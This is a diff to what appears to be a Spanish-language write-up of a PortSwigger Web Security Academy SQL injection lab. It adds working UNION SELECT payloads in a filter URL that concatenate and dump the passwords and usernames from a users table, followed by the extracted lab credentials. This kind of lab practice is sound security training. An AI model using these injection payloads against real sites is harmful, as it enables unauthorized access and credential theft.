@@ -43,5 +43,9 @@ To solve the lab, log in as the `administrator` user.
     # username_fzanak
 
 ## Dumpear los Datos
-.web-security-academy.net/filter?category=-Pets' Union Select '1',concat(password_wyuxxb,' ::: ',username_fzanak) FROM 'users_tcaine' -- -
+.web-security-academy.net/filter?category=-Pets' Union Select '1',concat(password_wyuxxb,' ::: ',username_fzanak) from users_tcaine -- -
+.web-security-academy.net/filter?category=-Pets' Union Select '1',password_wyuxxb||' : '||username_fzanak from users_tcaine -- -
+    # ybh5rrmndjm9grpgaac3 ::: administrator
+    # f18xc226xxi0tb4g9zpv ::: carlos
+    # onix1tykwp2vvyphg0gb ::: wiener
 ````
